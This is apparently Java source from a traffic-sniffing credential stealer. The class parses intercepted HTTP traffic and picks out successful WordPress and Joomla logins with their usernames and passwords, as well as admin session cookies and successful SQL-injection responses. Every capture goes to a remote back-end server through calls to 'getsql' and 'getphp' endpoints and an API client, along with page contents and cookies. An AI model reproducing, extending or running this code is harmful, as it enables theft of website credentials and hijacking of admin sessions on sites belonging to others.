package struct;

import base.ApiClass;
import base.Helper;
import base.Hex;
import base.Memcached;
import base.ScriptConfig;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class HttpInfoParser {

    public HttpInfo info;
    public HttpInfoResult result;

    private String get_url() {
        String r = "http://" + info.request.host + info.request.path;
        return r;
    }

    private String get_request_key(String cms_name) {
        String ua = this.info.request.uagent != null ? this.info.request.uagent : "1";
        return Helper.md5Custom(cms_name + "|" + info.request.host + "|" + ua);
    }

    public boolean check_wp() {
        if ((info.responce.code >= 400) || (info.responce.code < 200)) {
            return false;
        }

        if (!info.request.is_post) {
            return false;
        }

        if ((!info.request.post.containsKey("log")) || (!info.request.post.containsKey("pwd"))) {
            return false;
        }

        HashMap<String, String> cookies = new HashMap();
        cookies.putAll(info.request.cookies.cookies);
        cookies.putAll(info.responce.cookies.cookies);

        //Pattern p_chk1 = Pattern.compile("wordpress_[a-z0-9]{32,128}",Pattern.UNIX_LINES);
        boolean find1 = false;
        boolean find2 = true;
        boolean find22 = false;
        boolean find3 = false;
        boolean find4 = false;

        for (Map.Entry<String, String> entry : info.responce.cookies.cookies.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();
            if (key.equals("wordpress_test_cookie")) {
                find2 = false;
                continue;
            }

            if (value.equals("deleted")) {
                continue;
            }

            if (key.indexOf("_clef_") > 0) {
                continue;
            }

            if (key.matches("wordpress_[a-z0-9]{32,128}")) {
                find22 = true;
            }
        }

        find2 = find2 || find22;

        for (Map.Entry<String, String> entry : cookies.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();
            if (value.equals("deleted")) {
                continue;
            }

            if (key.indexOf("_clef_") > 0) {
                continue;
            }

            if (key.equals("wordpress_test_cookie")) {
                continue;
            }
            if (key.indexOf("wordpress") >= 0) {
                find1 = true;
                continue;
            }
            if (key.indexOf("wordpress_logged_in") >= 0) {
                find3 = true;
                continue;
            }
            if (key.indexOf("wordpressuser_") >= 0) {
                find4 = true;
                continue;
            }
        }

        if (info.responce.location != null) {
            if ((info.request.path.indexOf("redirect_to") >= 0) || (info.responce.location.indexOf("redirect_to") >= 0)) {
                if ((info.responce.location.indexOf("&reauth=1") >= 0)) {
                    return false;
                }
            }
        }

        boolean is_ok = (find1 && find2) || (find3 && find4);

        if (is_ok) {
            this.result = new HttpInfoResult(1, this.get_url(), info.request.post.get("log"), info.request.post.get("pwd"));
            if (info.request.authorization != null) {
                this.result.authorization = info.request.authorization;
            }
        }
        return is_ok;
    }

    public boolean check_joomla() {
        Memcached memcached = Memcached.getInstance();
        if (info.request.is_post) {
            if ((!info.request.post.containsKey("username")) || (!info.request.post.containsKey("passwd")) || (!info.request.post.containsKey("option"))) {
                return false;
            }

            String option = info.request.post.get("option");
            if (!option.equals("com_login")) {
                return false;
            }

            String login = info.request.post.get("username");
            String password = info.request.post.get("passwd");

            String key = this.get_request_key("joomla");
            HttpInfoResult result = new HttpInfoResult(2, this.get_url(), login, password);
            memcached.set(key, result);

            //String login = info.request.post.get("username");
        } else {
            String key = this.get_request_key("joomla");
            HttpInfoResult result = memcached.get(key);
            if (result == null) {
                return false;
            }

            if ((this.info.html.indexOf("task=logout") > 0) && (this.info.html.indexOf("option=com_login") > 0)) {
                this.result = result;
                if (info.request.authorization != null) {
                    this.result.authorization = info.request.authorization;
                }
                memcached.set_null(key);
                return true;
            }
        }
        return false;
    }

    public boolean check_sql() {
        Pattern p = Pattern.compile("0x([0-9a-fA-F]{8,888})");
        if (this.info.request.path_lower.indexOf("select") > 0) {
            Matcher m = p.matcher(this.info.request.path_lower);
            if (m.find()) {
                String sub = Hex.unhex(m.group(1));
                if (sub != null) {
                    if (info.html.indexOf(sub) >= 0) {
                        String url = Config.url_back + "/api/getsql/?url=" + Hex.StrToUrlHex(this.get_url());
                        ApiClass api = new ApiClass(url);
                        api.start();
                        return true;
                    }
                }
            }
            return false;
        }

        if (this.info.request.is_post) {
            for (Map.Entry<String, String> entry : info.request.post.entrySet()) {
                String key = entry.getKey();
                String value = entry.getValue();
                if (value.toLowerCase().indexOf("select") >= 0) {
                    Matcher m = p.matcher(value);
                    if (m.find()) {
                        String sub = Hex.unhex(m.group(1));
                        if (sub != null) {
                            if (info.html.indexOf(sub) >= 0) {
                                String post = Hex.StrToUrlHex(key + "=" + value);
                                String url = Config.url_back + "/api/getsql/?url=" + Hex.StrToUrlHex(this.get_url()) + "&post=" + post;
                                ApiClass api = new ApiClass(url);
                                api.start();
                                return true;
                            }
                        }
                    }
                }
            }
        }

        for (Map.Entry<String, String> entry : info.request.cookies.cookies.entrySet()) {
            //String key = entry.getKey();
            String value = entry.getValue();
            if (value.toLowerCase().indexOf("select") >= 0) {
                Matcher m = p.matcher(value);
                if (m.find()) {
                    String sub = Hex.unhex(m.group(1));
                    if (sub != null) {
                        if (info.html.indexOf(sub) >= 0) {
                            String cookie = Hex.StrToUrlHex(this.info.request.cookies.cookieSTR());
                            String url = Config.url_back + "/api/getsql/?url=" + Hex.StrToUrlHex(this.get_url()) + "&cookie=" + cookie;
                            ApiClass api = new ApiClass(url);
                            api.start();
                            return true;
                        }
                    }
                }
            }
        }

        return false;

    }

    public boolean check_php() {
        if (this.info.request.path_lower.indexOf("index.php") > 0) {
            return false;
        }

        if (!this.info.request.path_lower.endsWith(".php")) {
            return false;
        }

        ScriptConfig sc = ScriptConfig.getInstance();
        for (int i = 0; i < sc.size(); i++) {
            PHPScript php_conf = sc.get(i);
            boolean chk1 = false, chk2 = false;
            for (int i1 = 0; i1 < php_conf.text.size(); i1++) {
                String t = php_conf.text.get(i1);
                if (this.info.html.indexOf(t) >= 0) {
                    chk1 = true;
                    break;
                }
            }

            if (php_conf.text2.isEmpty()) {
                chk2 = true;
            } else {
                for (int i1 = 0; i1 < php_conf.text2.size(); i1++) {
                    String t = php_conf.text2.get(i1);
                    if (this.info.html.indexOf(t) >= 0) {
                        chk2 = true;
                        break;
                    }
                }
            }

            if (chk1 && chk2) {
                String target_url = Config.url_back + "/api/getphp/?url=" + Hex.StrToUrlHex(this.get_url());
                target_url += "&alias=" + Hex.StrToUrlHex(php_conf.alias);
                target_url += "&cookie=" + Hex.StrToUrlHex(this.info.request.cookies.cookieSTR());
                String post = "content=" + Hex.StrToUrlHex(this.info.html);
                ApiClass api = new ApiClass(target_url, post);
                api.start();
                return true;
            }

        }

        return false;
    }

    public boolean check_wp_admin_session() {
        if (this.info.request.path.indexOf("/wp-admin") < 0) {
            return false;
        }

        if (this.info.html.indexOf("plugin-install.php") < 0) {
            return false;
        }

        Memcached cache = Memcached.getInstance();
        String key = "session_" + this.info.request.host;
        if (cache.get(key) != null) {
            return false;
        }

        this.result = new HttpInfoResult(true, 1, this.get_url(), this.info.request.uagent, this.info.request.cookies.cookieSTR());

        cache.set(key, result);

        return true;
    }

    public boolean check_joomla_admin_session() {
        if (this.info.request.path.indexOf("/administrator") < 0) {
            return false;
        }

        if (this.info.html.indexOf("option=com_installer") < 0) {
            return false;
        }

        Memcached cache = Memcached.getInstance();
        String key = "session_" + this.info.request.host;
        if (cache.get(key) != null) {
            return false;
        }

        this.result = new HttpInfoResult(true, 2, this.get_url(), this.info.request.uagent, this.info.request.cookies.cookieSTR());

        cache.set(key, result);

        return true;
    }

    public boolean check() {
        this.result = null;

        if (this.check_wp()) {
            ApiClass api = new ApiClass(this.result);
            api.start();
            return true;
        }

        if (this.info.html == null) {
            return false;
        }

        if (this.check_joomla()) {
            ApiClass api = new ApiClass(this.result);
            api.start();
            return true;
        }

        if (this.check_sql()) {
            return true;
        }

        if (this.check_php()) {
            return true;
        }

        if (this.check_wp_admin_session()) {
            ApiClass api = new ApiClass(this.result);
            api.start();
            return true;
        }

        if (this.check_joomla_admin_session()) {
            ApiClass api = new ApiClass(this.result);
            api.start();
            return true;
        }

        return false;
    }

}
